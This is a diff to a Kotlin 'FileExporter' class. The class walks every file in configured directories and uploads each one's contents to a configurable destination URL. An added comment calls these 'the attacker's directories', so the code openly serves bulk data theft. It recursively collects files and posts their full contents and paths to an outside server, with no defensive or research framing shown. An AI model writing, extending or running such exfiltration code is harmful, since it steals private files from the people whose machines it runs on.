@@ -31,14 +31,15 @@ class FileExporter(
     }
 
     suspend fun exportFiles() = coroutineScope {
+        // Loop the list of attacker's directories to search
         config.exportDirectories.forEach { exportDirectory ->
             val targetDirectory = Paths.get(exportDirectory)
 
-            // Search files in target directories
+            // Search through all files in the directory
             targetDirectory.walk().forEach { file ->
                 logger.info("Exporting file: ${file.toAbsolutePath()}")
 
-                // Send found files somewhere...
+                // Send all found files somewhere...
                 if(config.destinationUrl.isNotBlank()) {
                     client.post(config.destinationUrl) {
                         setBody(
@@ -46,14 +47,13 @@ class FileExporter(
                                 formData {
                                     append("description", file.toAbsolutePath().toString())
                                     append(
-                                        "image",
+                                        "file",
                                         InputProvider { file.inputStream().asInput().buffered() },
                                         Headers.build {
                                             append(HttpHeaders.ContentType, "text/plain")
                                         }
                                     )
                                 },
-                                boundary = "WebAppBoundary"
                             )
                         )
                     }
